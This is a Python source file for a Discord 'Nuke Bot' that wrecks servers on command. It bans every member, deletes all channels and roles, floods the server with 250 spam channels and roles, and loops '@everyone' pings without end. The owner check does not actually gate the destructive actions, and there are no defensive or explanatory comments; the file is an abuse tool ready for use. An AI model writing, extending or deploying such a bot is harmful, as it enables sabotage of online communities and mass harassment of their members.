import discord
from discord.ext import commands,tasks
from itertools import cycle
import asyncio
import json

with open("config.json","r") as f:
    config=json.load(f)
version="0.1/alpha"
token=config.get("token")
c_prefix=config.get("prefix")
id=config.get("id")
silent=False
Jumbopic=config.get("JumboPic")
nukegif=config.get("nukegif")

client = commands.Bot(command_prefix = f'{c_prefix}',intents=discord.Intents.all())
client.remove_command('help')
bot_status = cycle([f'{c_prefix}help','discord.py'])


ad=f"""
███╗   ██╗██╗   ██╗██╗  ██╗███████╗    ██████╗  ██████╗ ████████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝    ██╔══██╗██╔═══██╗╚══██╔══╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗      ██████╔╝██║   ██║   ██║   
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝      ██╔══██╗██║   ██║   ██║   
██║ ╚████║╚██████╔╝██║  ██╗███████╗    ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝  ╚═════╝    ╚═╝   
Version: {version}
Silent Mode: {silent}
Command Prefix: {c_prefix}
"""

@client.event
async def on_ready():
    print(f"[!]Logged in as {client.user.name}@{client.user.id}[!]")
    print()
    print(ad)
    change_status.start()

@tasks.loop(seconds=15)
async def change_status():
    await client.change_presence(activity=discord.Game(next(bot_status)))

@client.command()
async def help(ctx:commands.Context):
    helplog=('''
             [Nuke]:Nukes Everything. 
             [BanAll]:Bans all the members
             [RolesDelete]:Deletes all the roles.
             [RoleSpam]:Spams Roles.
             [ChannelDelete]:Deletes all the channels.
             [ChannelSpam]:Spams Channels.
             [SpamPing]:Spams Ping.
             ''')
    
    
    
    await ctx.message.delete()
    embed=discord.Embed(color=ctx.author.color)
    embed.set_author(name="Nuke Bot / Made by Joe Mama")
    embed.add_field(name="Nuke",value="\nNukes Everything.",inline=False)
    embed.add_field(name="BanAll",value="\nBans all the members.",inline=False)
    embed.add_field(name="RolesDelete",value="\nDeletes all the roles.",inline=False)
    embed.add_field(name="RoleSpam",value="\nSpams Roles.",inline=False)
    embed.add_field(name="ChannelDelete",value="\nDeletes all the channels.",inline=False)
    embed.add_field(name="ChannelSpam",value="\nSpams Channels.",inline=False)
    embed.add_field(name="SpamPing",value="\nSpams Ping.",inline=False)
    
    embed.set_thumbnail(url=Jumbopic)
    if ctx.author.id in [id]:
        if silent is False:
            await ctx.send(embed=embed)
        else:
            print(helplog)
    else:pass

@client.command()
async def ChannelDelete(ctx:commands.Context):
    await ctx.message.delete()
    if ctx.author.id in [id]:
        if silent is False:await ctx.send("```Deleting Channels```")
        else:print("[!]Deleting Channels[!]")
    else: pass
        
    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass

@client.command()
async def SpamPing(ctx:commands.Context,*,msg:str):
    await ctx.message.delete()
    if ctx.author.id in [id]:
        if silent is False:await ctx.send("```Spamming Channels```")
        else:print("[!]Spamming Channels[!]")
    else:pass
    
    for channel in list(ctx.guild.channels):
        try:
            while True:
                for _ in range(25):
                    await channel.send(f"@everyone {msg}")
        except: pass

@client.command()
async def BanAll(ctx:commands.Context):
    await ctx.message.delete()
    if ctx.author.id in [id]:
        if silent is False: await ctx.send("```Banning all members```")
        else:print("[!]Banning all members[!]")
    else:pass
    
    for user in list(ctx.guild.members):
        try: await user.ban()
        except: pass

@client.command()
async def RolesDelete(ctx:commands.Context):
    await ctx.message.delete()
    if ctx.author.id in [id]:
        if silent is False:await ctx.send("```Deleting all roles```")
        else: print("[!]Deleting all roles[!]")
    else:pass
    
    for role in list(ctx.guild.roles):
        try: await role.delete()
        except: pass

@client.command()
async def RolesSpam(ctx:commands.Context,*,name:str):
    await ctx.message.delete()
    if ctx.author.id in [id]:
        if silent is False:await ctx.send("```Spamming Roles```")
        else:print("[!]Spamming Roles[!]")
    else:pass
    
    for _ in range(250):await ctx.guild.create_role(name=f"{name}")

@client.command()
async def ChannelSpam(ctx:commands.Context,*,name:str):
    await ctx.message.delete()
    if ctx.author.id in [id]:
        if silent  in  "off":await ctx.send("```Spamminf Channels```")
        else:print("[!]Spamming Channels[!]")
    else:pass
    
    for _ in range(250): await ctx.guild.create_text_channel(name=f"{name}")

@client.event
async def on_command_error(ctx:commands.Context,error):
    await ctx.message.delete()
    
    if silent is False: await ctx.send("Command Not Found!",delete_after=3)
    else: print("[!]Command Not Found[!]")
    

@client.command()
async def Nuke(ctx:commands.Context):
    if ctx.author.id in [id]:
        if silent is False:await ctx.send(f"```Nuking```\n{nukegif}")
        else:print("[!]Nuking[!]")
    else:pass
    
    for user in list(ctx.guild.members):
        try: await user.ban()
        except: pass
    
    for channel in list(ctx.guild.channels):
        try: await channel.delete()
        except: pass
    
    for role in list(ctx.guild.roles):
        try:await role.delete()
        except:pass
    
    for _ in range(250):
        await ctx.guild.create_text_channel(name="nuked-by-joe-mama")
    for _ in range(250):
        await ctx.guild.create_role(name="nuked-by-joe-mama")
        
    print("[!]Nuked[!]")

async def main():
    async with client:
        #await load()
        await client.start(token=token)

asyncio.run(main())